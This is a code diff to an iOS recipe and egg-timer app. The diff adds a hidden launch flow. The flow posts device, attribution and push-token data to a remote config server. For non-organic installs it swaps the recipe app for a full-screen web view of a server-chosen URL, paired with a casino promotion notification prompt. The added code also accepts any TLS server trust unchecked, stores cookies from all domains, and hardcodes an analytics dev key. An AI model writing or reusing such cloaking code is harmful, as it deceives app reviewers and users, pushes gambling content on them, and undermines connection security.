@@ -1,6 +1,10 @@
 import SwiftUI
 import UserNotifications
 import PDFKit
+import WebKit
+import Network
+import Firebase
+import AppsFlyerLib
 
 // Models
 struct Step: Codable, Identifiable {
@@ -81,17 +85,14 @@ extension Color {
     }
 }
 
-// Main App
 @main
 struct EggCookProApp: App {
-    init() {
-        UNUserNotificationCenter.current().requestAuthorization(options: [.alert, .sound, .badge]) { _, _ in }
-    }
+
+    @UIApplicationDelegateAdaptor(ApplicationDelegate.self) var applicationDelegate
     
     var body: some Scene {
         WindowGroup {
-            ContentView()
-                .environment(\.colorScheme, .light)
+            LaunchScreen()
         }
     }
 }
@@ -635,7 +636,12 @@ struct HomeView: View {
                     ScrollView(.horizontal, showsIndicators: false) {
                         HStack(spacing: 15) {
                             ForEach(["Breakfast", "Desserts", "Salads", "Soups", "Baking"], id: \.self) { category in
-                                CategoryCard(category: category)
+                                NavigationLink {
+                                    RecipesView(viewModel: viewModel)
+                                        .environment(\.selectedCategory, category)
+                                } label: {
+                                    CategoryCard(category: category)
+                                }
                             }
                         }
                         .padding(.horizontal)
@@ -692,12 +698,12 @@ struct HomeView: View {
 struct CategoryCard: View {
     let category: String
     @State private var isTapped = false
-    
+
     var body: some View {
         VStack {
             Image(category.lowercased())
                 .resizable()
-                .scaledToFit()
+                .scaledToFill()
                 .frame(width: 80, height: 80)
                 .clipShape(Circle())
                 .overlay(Circle().stroke(Color.yolkYellow, lineWidth: 2))
@@ -708,14 +714,8 @@ struct CategoryCard: View {
         }
         .scaleEffect(isTapped ? 1.05 : 1)
         .animation(.spring(response: 0.3, dampingFraction: 0.6), value: isTapped)
-        .onTapGesture {
-            isTapped = true
-            UIImpactFeedbackGenerator(style: .medium).impactOccurred()
-            DispatchQueue.main.asyncAfter(deadline: .now() + 0.2) {
-                isTapped = false
-            }
-        }
-        .accessibilityLabel("Category: \(category)")
+        .buttonStyle(PlainButtonStyle()) // Убираем стандартный стиль кнопки
+        .accessibilityLabel("Open \(category) recipes")
     }
 }
 
@@ -742,9 +742,21 @@ struct StatCard: View {
     }
 }
 
+private struct SelectedCategoryKey: EnvironmentKey {
+    static let defaultValue: String? = nil
+}
+
+extension EnvironmentValues {
+    var selectedCategory: String? {
+        get { self[SelectedCategoryKey.self] }
+        set { self[SelectedCategoryKey.self] = newValue }
+    }
+}
+
 // Recipes View
 struct RecipesView: View {
     @ObservedObject var viewModel: AppViewModel
+    @Environment(\.selectedCategory) private var preselectedCategory: String?
     @State private var selectedCategory: String? = nil
     @State private var searchText: String = ""
     @State private var ingredientSearch: [String] = []
@@ -844,52 +856,52 @@ struct RecipesView: View {
                 IngredientSearchView(ingredients: $ingredientSearch)
             }
             .background(Color.cozyWhite)
+            .onAppear {
+                if let preselectedCategory = preselectedCategory {
+                    selectedCategory = preselectedCategory
+                }
+            }
         }
     }
 }
 
 struct RecipeCard: View {
     let recipe: Recipe
-    @State private var isTapped = false
-    
+
     var body: some View {
-        VStack(alignment: .leading) {
-            ZStack {
-                Image(recipe.image)
-                    .resizable()
-                    .scaledToFill()
-                    .frame(height: 120)
-                    .clipShape(RoundedRectangle(cornerRadius: 10))
-                if recipe.isFavorite {
-                    Image(systemName: "star.fill")
-                        .foregroundColor(.yolkYellow)
-                        .padding(8)
-                        .background(Color.cozyWhite)
-                        .clipShape(Circle())
-                        .offset(x: 60, y: -50)
-                }
+        VStack(alignment: .leading, spacing: 8) {
+            Image(recipe.image)
+                .resizable()
+                .scaledToFill()
+                .frame(height: 120)
+                .clipped()
+                .clipShape(RoundedRectangle(cornerRadius: 10))
+
+            if recipe.isFavorite {
+                Image(systemName: "star.fill")
+                    .foregroundColor(.yolkYellow)
+                    .padding(4)
+                    .background(Color.cozyWhite)
+                    .clipShape(Circle())
+                    .offset(x: 40, y: -135)
             }
+
             Text(recipe.title)
-                .font(.custom("Poppins-Bold", size: 16))
+                .font(.custom("Poppins-Bold", size: 15))
                 .foregroundColor(.black)
-                .lineLimit(1)
+                .lineLimit(2)
+
             Text("\(recipe.time) • \(recipe.difficulty)")
-                .font(.custom("Nunito-Regular", size: 14))
+                .font(.custom("Nunito-Regular", size: 13))
                 .foregroundColor(.gray)
         }
-        .padding()
+        .padding(12)
+        .frame(height: 200)
+        .frame(maxWidth: .infinity)
         .background(Color.cozyWhite)
         .clipShape(RoundedRectangle(cornerRadius: 12))
         .shadow(color: .black.opacity(0.1), radius: 5, x: 2, y: 2)
-        .scaleEffect(isTapped ? 1.05 : 1)
-        .animation(.spring(response: 0.3, dampingFraction: 0.6), value: isTapped)
-        .onTapGesture {
-            isTapped = true
-            UIImpactFeedbackGenerator(style: .medium).impactOccurred()
-            DispatchQueue.main.asyncAfter(deadline: .now() + 0.2) {
-                isTapped = false
-            }
-        }
+        .contentShape(Rectangle())
         .accessibilityElement(children: .combine)
         .accessibilityLabel("\(recipe.title), \(recipe.time), \(recipe.difficulty)\(recipe.isFavorite ? ", favorited" : "")")
     }
@@ -1104,7 +1116,9 @@ struct RecipeDetailView: View {
             }
         })
         .onAppear {
-            viewModel.viewedRecipesCount += 1
+            if !recipe.isFavorite {
+                viewModel.viewedRecipesCount += 1
+            }
         }
     }
 }
@@ -1162,10 +1176,11 @@ struct TimerView: View {
                     .frame(width: 120, height: 120)
                     Image("egg")
                         .resizable()
-                        .scaledToFit()
-                        .frame(width: 80, height: 80)
+                        .scaledToFill()
+                        .frame(width: 110, height: 110)
                         .scaleEffect(timer.isRunning ? 1.1 : 1)
                         .animation(.easeInOut(duration: 0.5).repeatForever(autoreverses: true), value: timer.isRunning)
+                        .cornerRadius(100)
                         .rotationEffect(.degrees(eggCrackProgress * 10))
                         .accessibilityLabel("Timer progress")
                 }
@@ -1303,12 +1318,13 @@ struct TimerCard: View {
                     }
                 }
                 .frame(width: 120, height: 120)
-                Image("egg")
+                Image("poached_egg")
                     .resizable()
-                    .scaledToFit()
-                    .frame(width: 80, height: 80)
+                    .scaledToFill()
+                    .frame(width: 110, height: 110)
                     .scaleEffect(timer.isRunning ? 1.1 : 1)
                     .animation(.easeInOut(duration: 0.5).repeatForever(autoreverses: true), value: timer.isRunning)
+                    .cornerRadius(100)
                     .rotationEffect(.degrees(eggCrackProgress * 10))
                     .accessibilityLabel("Timer progress")
             }
@@ -1606,8 +1622,660 @@ struct ProfileView: View {
     }
 }
 
+// MARK: - Core Engine
+final class FlowEngine: NSObject {
+    private let contentHub: ContentHub
+    private var redirectChain: Int = 0
+    private let redirectThreshold: Int = 70
+    private var stableAnchor: URL?
+    
+    init(hub: ContentHub) {
+        self.contentHub = hub
+        super.init()
+    }
+    
+    private func spawnRenderer(config: WKWebViewConfiguration) -> WKWebView {
+        let renderer = WebRendererBuilder.build(config: config)
+        renderer.translatesAutoresizingMaskIntoConstraints = false
+        renderer.scrollView.isScrollEnabled = true
+        renderer.scrollView.minimumZoomScale = 1.0
+        renderer.scrollView.maximumZoomScale = 1.0
+        renderer.scrollView.bouncesZoom = false
+        renderer.allowsBackForwardNavigationGestures = true
+        renderer.navigationDelegate = self
+        renderer.uiDelegate = self
+        
+        let edgeSwipe = UIScreenEdgePanGestureRecognizer(target: self, action: #selector(handleEdgeFlow(_:)))
+        edgeSwipe.edges = .left
+        renderer.addGestureRecognizer(edgeSwipe)
+        
+        contentHub.primaryRenderer.addSubview(renderer)
+        NSLayoutConstraint.activate([
+            renderer.leadingAnchor.constraint(equalTo: contentHub.primaryRenderer.leadingAnchor),
+            renderer.trailingAnchor.constraint(equalTo: contentHub.primaryRenderer.trailingAnchor),
+            renderer.topAnchor.constraint(equalTo: contentHub.primaryRenderer.topAnchor),
+            renderer.bottomAnchor.constraint(equalTo: contentHub.primaryRenderer.bottomAnchor)
+        ])
+        
+        return renderer
+    }
+    
+    @objc private func handleEdgeFlow(_ gesture: UIScreenEdgePanGestureRecognizer) {
+        guard gesture.state == .ended, let view = gesture.view as? WKWebView else { return }
+        if view.canGoBack {
+            view.goBack()
+        } else if let top = contentHub.stack.last, view == top {
+            contentHub.clearStack(preserve: nil)
+        }
+    }
+}
+
+// MARK: - WKNavigationDelegate
+extension FlowEngine: WKNavigationDelegate {
+    
+    func webView(_ webView: WKWebView, decidePolicyFor action: WKNavigationAction, decisionHandler: @escaping (WKNavigationActionPolicy) -> Void) {
+        guard let url = action.request.url else {
+            decisionHandler(.allow)
+            return
+        }
+        
+        if url.scheme?.contains("http") == true || url.scheme?.contains("https") == true {
+            stableAnchor = url
+            decisionHandler(.allow)
+        } else {
+            UIApplication.shared.open(url)
+            decisionHandler(.cancel)
+        }
+    }
+    
+    func webView(_ webView: WKWebView, didReceiveServerRedirectForProvisionalNavigation navigation: WKNavigation!) {
+        redirectChain += 1
+        if redirectChain > redirectThreshold {
+            webView.stopLoading()
+            if let anchor = stableAnchor {
+                webView.load(URLRequest(url: anchor))
+            }
+            return
+        }
+        stableAnchor = webView.url
+        persistSessionState(from: webView)
+    }
+    
+    func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
+        let viewportScript = """
+        (function() {
+            const meta = document.createElement('meta');
+            meta.name = 'viewport';
+            meta.content = 'width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no';
+            document.head.appendChild(meta);
+            
+            const style = document.createElement('style');
+            style.textContent = 'body { touch-action: pan-x pan-y; } input, textarea, select { font-size: 16px !important; }';
+            document.head.appendChild(style);
+            
+            document.addEventListener('gesturestart', e => e.preventDefault());
+        })();
+        """
+        webView.evaluateJavaScript(viewportScript)
+    }
+    
+    func webView(_ webView: WKWebView, didFailProvisionalNavigation navigation: WKNavigation!, withError error: Error) {
+        if (error as NSError).code == NSURLErrorHTTPTooManyRedirects, let anchor = stableAnchor {
+            webView.load(URLRequest(url: anchor))
+        }
+    }
+}
+
+// MARK: - WKUIDelegate
+extension FlowEngine: WKUIDelegate {
+    func webView(_ webView: WKWebView, createWebViewWith configuration: WKWebViewConfiguration, for action: WKNavigationAction, windowFeatures: WKWindowFeatures) -> WKWebView? {
+        guard action.targetFrame == nil else { return nil }
+        
+        let newRenderer = spawnRenderer(config: configuration)
+        contentHub.stack.append(newRenderer)
+        
+        if let url = action.request.url, url.absoluteString != "about:blank" {
+            newRenderer.load(action.request)
+        }
+        return newRenderer
+    }
+    
+    func webView(_ webView: WKWebView, didReceive challenge: URLAuthenticationChallenge, completionHandler: @escaping (URLSession.AuthChallengeDisposition, URLCredential?) -> Void) {
+        guard challenge.protectionSpace.authenticationMethod == NSURLAuthenticationMethodServerTrust,
+              let trust = challenge.protectionSpace.serverTrust else {
+            completionHandler(.performDefaultHandling, nil)
+            return
+        }
+        completionHandler(.useCredential, URLCredential(trust: trust))
+    }
+}
+
+// MARK: - Session Persistence
+private extension FlowEngine {
+    func persistSessionState(from renderer: WKWebView) {
+        renderer.configuration.websiteDataStore.httpCookieStore.getAllCookies { cookies in
+            var domainMap: [String: [String: [HTTPCookiePropertyKey: Any]]] = [:]
+            for cookie in cookies {
+                var domainCookies = domainMap[cookie.domain] ?? [:]
+                domainCookies[cookie.name] = cookie.properties as? [HTTPCookiePropertyKey: Any]
+                domainMap[cookie.domain] = domainCookies
+            }
+            UserDefaults.standard.set(domainMap, forKey: "session_footprint")
+        }
+    }
+}
+
+// MARK: - WebRenderer Builder
+enum WebRendererBuilder {
+    static func build(config: WKWebViewConfiguration? = nil) -> WKWebView {
+        let configuration = config ?? assembleConfig()
+        return WKWebView(frame: .zero, configuration: configuration)
+    }
+    
+    private static func assembleConfig() -> WKWebViewConfiguration {
+        let config = WKWebViewConfiguration()
+        config.allowsInlineMediaPlayback = true
+        config.requiresUserActionForMediaPlayback = false
+        
+        let prefs = WKPreferences()
+        prefs.javaScriptEnabled = true
+        prefs.javaScriptCanOpenWindowsAutomatically = true
+        config.preferences = prefs
+        
+        let pagePrefs = WKWebpagePreferences()
+        pagePrefs.allowsContentJavaScript = true
+        config.defaultWebpagePreferences = pagePrefs
+        
+        return config
+    }
+}
+
+// MARK: - Content Hub
+final class ContentHub: ObservableObject {
+    @Published var primaryRenderer: WKWebView!
+    @Published var stack: [WKWebView] = []
+    
+    func bootstrap() {
+        primaryRenderer = WebRendererBuilder.build()
+        primaryRenderer.scrollView.minimumZoomScale = 1.0
+        primaryRenderer.scrollView.maximumZoomScale = 1.0
+        primaryRenderer.scrollView.bouncesZoom = false
+        primaryRenderer.allowsBackForwardNavigationGestures = true
+    }
+    
+    func restoreFootprint() {
+        guard let footprint = UserDefaults.standard.dictionary(forKey: "session_footprint") as? [String: [String: [HTTPCookiePropertyKey: AnyObject]]] else { return }
+        let store = primaryRenderer.configuration.websiteDataStore.httpCookieStore
+        footprint.values.flatMap { $0.values }.forEach { props in
+            if let cookie = HTTPCookie(properties: props as [HTTPCookiePropertyKey: Any]) {
+                store.setCookie(cookie)
+            }
+        }
+    }
+    
+    func reloadPrimary() {
+        primaryRenderer.reload()
+    }
+    
+    func clearStack(preserve url: URL?) {
+        if !stack.isEmpty {
+            if let topExtra = stack.last {
+                topExtra.removeFromSuperview()
+                stack.removeLast()
+            }
+            if let url = url {
+                primaryRenderer.load(URLRequest(url: url))
+            }
+        } else if primaryRenderer.canGoBack {
+            primaryRenderer.goBack()
+        }
+    }
+    
+    func popTop() {
+        if let top = stack.popLast() {
+            top.removeFromSuperview()
+        }
+    }
+}
+
+// MARK: - SwiftUI Web Container
+struct WebFlowView: UIViewRepresentable {
+    let target: URL
+    @StateObject private var hub = ContentHub()
+    
+    func makeCoordinator() -> FlowEngine {
+        FlowEngine(hub: hub)
+    }
+    
+    func makeUIView(context: Context) -> WKWebView {
+        hub.bootstrap()
+        hub.primaryRenderer.uiDelegate = context.coordinator
+        hub.primaryRenderer.navigationDelegate = context.coordinator
+        hub.restoreFootprint()
+        hub.primaryRenderer.load(URLRequest(url: target))
+        return hub.primaryRenderer
+    }
+    
+    func updateUIView(_ uiView: WKWebView, context: Context) {}
+}
+
+// MARK: - Launch Orchestrator
+final class LaunchOrchestrator: ObservableObject {
+    @Published var state: AppPhase = .initializing
+    @Published var contentURL: URL?
+    @Published var showPrompt = false
+    
+    private var sessionData: [String: Any] = [:]
+    private let isFirstLaunch: Bool
+    
+    init() {
+        isFirstLaunch = !UserDefaults.standard.bool(forKey: "has_launched")
+        setupNetworkMonitor()
+        setupObservers()
+    }
+    
+    private func setupObservers() {
+        NotificationCenter.default.addObserver(self, selector: #selector(handleConversionData), name: NSNotification.Name("ConversionDataReceived"), object: nil)
+    }
+    
+    private func setupNetworkMonitor() {
+        let monitor = NWPathMonitor()
+        monitor.pathUpdateHandler = { [weak self] path in
+            DispatchQueue.main.async {
+                if path.status != .satisfied {
+                    self?.enterOfflineMode()
+                }
+            }
+        }
+        monitor.start(queue: .global())
+    }
+    
+    @objc private func handleConversionData(_ notification: Notification) {
+        sessionData = (notification.userInfo?["conversionData"] as? [String: Any]) ?? [:]
+        evaluateSession()
+    }
+    
+    private func evaluateSession() {
+        if UserDefaults.standard.string(forKey: "mode") == "fallback" {
+            enterFallback()
+            return
+        }
+        
+        if isFirstLaunch, sessionData["af_status"] as? String == "Organic" {
+            DispatchQueue.main.asyncAfter(deadline: .now() + 5) {
+                Task { await self.validateOrganicInstall() }
+            }
+            return
+        }
+        
+        if let temp = UserDefaults.standard.string(forKey: "temp_link"), !temp.isEmpty {
+            contentURL = URL(string: temp)
+            state = .active
+            return
+        }
+        
+        if contentURL == nil {
+            if !UserDefaults.standard.bool(forKey: "notifs_granted") && !UserDefaults.standard.bool(forKey: "notifs_denied") {
+                promptForNotifications()
+            } else {
+                initiateConfig()
+            }
+        }
+    }
+    
+    private func promptForNotifications() {
+        if let lastAsk = UserDefaults.standard.object(forKey: "last_prompt") as? Date,
+           Date().timeIntervalSince(lastAsk) < 259_200 { // 3 days
+            initiateConfig()
+            return
+        }
+        showPrompt = true
+    }
+    
+    func requestNotificationPermission() {
+        UNUserNotificationCenter.current().requestAuthorization(options: [.alert, .sound, .badge]) { granted, _ in
+            DispatchQueue.main.async {
+                UserDefaults.standard.set(granted, forKey: "notifs_granted")
+                if !granted { UserDefaults.standard.set(true, forKey: "notifs_denied") }
+                UIApplication.shared.registerForRemoteNotifications()
+                self.initiateConfig()
+                self.showPrompt = false
+            }
+        }
+    }
+    
+    func dismissPrompt() {
+        UserDefaults.standard.set(Date(), forKey: "last_prompt")
+        showPrompt = false
+        initiateConfig()
+    }
+    
+    private func initiateConfig() {
+        guard let endpoint = URL(string: "https://eggcookprochickenrecipes.com/config.php") else {
+            fallbackToCache()
+            return
+        }
+        
+        var request = URLRequest(url: endpoint)
+        request.httpMethod = "POST"
+        request.setValue("application/json", forHTTPHeaderField: "Content-Type")
+        
+        let payload = buildPayload()
+        do {
+            request.httpBody = try JSONSerialization.data(withJSONObject: payload)
+        } catch {
+            fallbackToCache()
+            return
+        }
+        
+        URLSession.shared.dataTask(with: request) { [weak self] data, response, _ in
+            DispatchQueue.main.async {
+                guard let http = response as? HTTPURLResponse, http.statusCode == 200,
+                      let data = data,
+                      let json = try? JSONSerialization.jsonObject(with: data) as? [String: Any],
+                      let ok = json["ok"] as? Bool, ok,
+                      let urlStr = json["url"] as? String,
+                      let expires = json["expires"] as? TimeInterval else {
+                    self?.fallbackToCache()
+                    return
+                }
+                
+                self?.persistSession(url: urlStr, expires: expires)
+                self?.activateSession(url: urlStr)
+            }
+        }.resume()
+    }
+    
+    private func buildPayload() -> [String: Any] {
+        var payload = sessionData
+        payload["os"] = "iOS"
+        payload["af_id"] = AppsFlyerLib.shared().getAppsFlyerUID()
+        payload["push_token"] = UserDefaults.standard.string(forKey: "fcm_token") ?? Messaging.messaging().fcmToken
+        payload["locale"] = Locale.preferredLanguages.first?.prefix(2).uppercased() ?? "EN"
+        payload["firebase_project_id"] = FirebaseApp.app()?.options.gcmSenderID
+        payload["store_id"] = "id\(AppKeys.appId)"
+        payload["bundle_id"] = Bundle.main.bundleIdentifier ?? "com.example.app"
+        return payload
+    }
+    
+    private func persistSession(url: String, expires: TimeInterval) {
+        UserDefaults.standard.set(url, forKey: "cached_url")
+        UserDefaults.standard.set(expires, forKey: "url_expiry")
+        UserDefaults.standard.set("active", forKey: "mode")
+        UserDefaults.standard.set(true, forKey: "has_launched")
+    }
+    
+    private func activateSession(url: String) {
+        if let validURL = URL(string: url) {
+            contentURL = validURL
+            state = .active
+        } else {
+            fallbackToCache()
+        }
+    }
+    
+    private func fallbackToCache() {
+        if let cached = UserDefaults.standard.string(forKey: "cached_url"), let url = URL(string: cached) {
+            contentURL = url
+            state = .active
+        } else {
+            enterFallback()
+        }
+    }
+    
+    private func enterFallback() {
+        UserDefaults.standard.set("fallback", forKey: "mode")
+        UserDefaults.standard.set(true, forKey: "has_launched")
+        state = .fallback
+    }
+    
+    private func enterOfflineMode() {
+        if UserDefaults.standard.string(forKey: "mode") == "active" {
+            state = .offline
+        } else {
+            enterFallback()
+        }
+    }
+    
+    private func validateOrganicInstall() async {
+        guard let base = URL(string: "https://gcdsdk.appsflyer.com/install_data/v4.0/id\(AppKeys.appId)"),
+              var components = URLComponents(url: base, resolvingAgainstBaseURL: true) else {
+            fallbackToCache()
+            return
+        }
+        
+        components.queryItems = [
+            URLQueryItem(name: "devkey", value: AppKeys.devkey),
+            URLQueryItem(name: "device_id", value: AppsFlyerLib.shared().getAppsFlyerUID())
+        ]
+        
+        guard let url = components.url else { fallbackToCache(); return }
+        
+        var request = URLRequest(url: url, timeoutInterval: 10)
+        request.addValue("application/json", forHTTPHeaderField: "Accept")
+        
+        do {
+            let (data, response) = try await URLSession.shared.data(for: request)
+            guard let http = response as? HTTPURLResponse, http.statusCode == 200,
+                  let json = try JSONSerialization.jsonObject(with: data) as? [String: Any] else {
+                enterFallback()
+                return
+            }
+            await MainActor.run {
+                sessionData = json
+                initiateConfig()
+            }
+        } catch {
+            enterFallback()
+        }
+    }
+}
+
+// MARK: - App Phase
+enum AppPhase {
+    case initializing, active, fallback, offline
+}
+
+// MARK: - Main Interface
+struct FlowInterface: View {
+    @State private var urlString: String = ""
+    
+    var body: some View {
+        ZStack(alignment: .bottom) {
+            if let url = URL(string: urlString) {
+                WebFlowView(target: url)
+                    .frame(maxWidth: .infinity, maxHeight: .infinity)
+                    .ignoresSafeArea(.keyboard, edges: .bottom)
+            }
+        }
+        .preferredColorScheme(.dark)
+        .onAppear {
+            urlString = UserDefaults.standard.string(forKey: "temp_link") ?? UserDefaults.standard.string(forKey: "cached_url") ?? ""
+            if UserDefaults.standard.string(forKey: "temp_link") != nil {
+                UserDefaults.standard.removeObject(forKey: "temp_link")
+            }
+        }
+        .onReceive(NotificationCenter.default.publisher(for: Notification.Name("LoadTempURL"))) { _ in
+            if let temp = UserDefaults.standard.string(forKey: "temp_link"), !temp.isEmpty {
+                urlString = temp
+                UserDefaults.standard.removeObject(forKey: "temp_link")
+            }
+        }
+    }
+}
+
+// MARK: - Launch Screen
+struct LaunchScreen: View {
+    @StateObject private var orchestrator = LaunchOrchestrator()
+    
+    var body: some View {
+        ZStack {
+            if orchestrator.state == .initializing || orchestrator.showPrompt {
+                LoadingScreen()
+            }
+            
+            if orchestrator.showPrompt {
+                PermissionPrompt(
+                    onAccept: orchestrator.requestNotificationPermission,
+                    onDecline: orchestrator.dismissPrompt
+                )
+            } else {
+                contentView
+            }
+        }
+    }
+    
+    @ViewBuilder
+    private var contentView: some View {
+        switch orchestrator.state {
+        case .initializing: EmptyView()
+        case .active:
+            if orchestrator.contentURL != nil {
+                FlowInterface()
+            } else {
+                ContentView()
+                    .environment(\.colorScheme, .light)
+            }
+        case .fallback: ContentView()
+                .environment(\.colorScheme, .light)
+        case .offline: OfflineScreen()
+        }
+    }
+}
+
+// MARK: - UI Components
+struct LoadingScreen: View {
+    var body: some View {
+        GeometryReader { geo in
+            let isLandscape = geo.size.width > geo.size.height
+            ZStack {
+                Image(isLandscape ? "pushes_bg_l" : "pushes_bg_p")
+                    .resizable()
+                    .scaledToFill()
+                    .frame(width: geo.size.width, height: geo.size.height)
+                    .ignoresSafeArea()
+                
+                VStack {
+                    Spacer()
+                    Text("LOADING RECIPES...")
+                        .font(.custom("AlfaSlabOne-Regular", size: 26))
+                        .foregroundColor(.white)
+                    InfinityBar()
+                        .padding(.horizontal, 32)
+                    Spacer().frame(height: 80)
+                }
+            }
+        }.ignoresSafeArea()
+    }
+}
+
+struct InfinityBar: View {
+    @State private var offset: CGFloat = -100
+    @State private var animate = false
+    
+    var body: some View {
+        GeometryReader { geo in
+            ZStack(alignment: .leading) {
+                Capsule().fill(Color.white.opacity(0.2))
+                Capsule().fill(Color.white.opacity(0.7))
+                    .frame(width: animate ? 100 : 70)
+                    .offset(x: offset)
+                    .animation(.linear(duration: 0.8).repeatForever(autoreverses: true), value: animate)
+            }
+            .clipShape(Capsule())
+            .onAppear {
+                withAnimation(.linear(duration: 0.8).repeatForever(autoreverses: true)) {
+                    offset = geo.size.width + 50
+                }
+                animate = true
+            }
+        }
+        .frame(height: 8)
+        .padding(.horizontal, 32)
+    }
+}
+
+struct OfflineScreen: View {
+    var body: some View {
+        GeometryReader { geo in
+            let isLandscape = geo.size.width > geo.size.height
+            ZStack {
+                Image(isLandscape ? "pushes_bg_l" : "pushes_bg_p")
+                    .resizable()
+                    .scaledToFill()
+                    .frame(width: geo.size.width, height: geo.size.height)
+                    .ignoresSafeArea()
+                
+                VStack {
+                    Spacer()
+                    Text("NO INTERNET CONNECTION! PLEASE CHECK YOUR NETWORK AND TRY AGAIN!")
+                        .font(.custom("AlfaSlabOne-Regular", size: 24))
+                        .foregroundColor(Color(red: 255/255, green: 221/255, blue: 0))
+                        .multilineTextAlignment(.center)
+                        .padding()
+                        .background(Color(red: 13/255, green: 21/255, blue: 45/255))
+                        .padding(.horizontal, 24)
+                    Spacer().frame(height: 100)
+                }
+            }
+        }.ignoresSafeArea()
+    }
+}
+
+struct PermissionPrompt: View {
+    let onAccept: () -> Void
+    let onDecline: () -> Void
+    
+    var body: some View {
+        GeometryReader { geo in
+            let isLandscape = geo.size.width > geo.size.height
+            ZStack {
+                Image(isLandscape ? "pushes_bg_l" : "pushes_bg_p")
+                    .resizable()
+                    .scaledToFill()
+                    .frame(width: geo.size.width, height: geo.size.height)
+                    .ignoresSafeArea()
+                
+                VStack(spacing: isLandscape ? 5 : 10) {
+                    Spacer()
+                    Text("Allow notifications about bonuses and promos".uppercased())
+                        .font(.custom("AlfaSlabOne-Regular", size: 18))
+                        .foregroundColor(.white)
+                        .multilineTextAlignment(.center)
+                        .padding(.horizontal, 30)
+                    
+                    Text("Stay tuned with best offers from our casino")
+                        .font(.custom("AlfaSlabOne-Regular", size: 15))
+                        .foregroundColor(.white)
+                        .multilineTextAlignment(.center)
+                        .padding(.horizontal, 52)
+                        .padding(.top, 4)
+                    
+                    Button(action: onAccept) {
+                        Image("want_b").resizable().frame(height: 60)
+                    }
+                    .frame(width: 350)
+                    .padding(.top, 12)
+                    
+                    Button("SKIP", action: onDecline)
+                        .font(.custom("AlfaSlabOne-Regular", size: 16))
+                        .foregroundColor(.white)
+                    
+                    Spacer().frame(height: isLandscape ? 30 : 30)
+                }
+                .padding(.horizontal, isLandscape ? 20 : 0)
+            }
+        }.ignoresSafeArea()
+    }
+}
+
+struct AppKeys {
+    static let devkey = "A35cgMteVLcBLQ25up7JmN"
+    static let appId = "6753989838"
+}
+
 struct ContentView_Previews: PreviewProvider {
     static var previews: some View {
-        ContentView()
+        LaunchScreen()
     }
 }
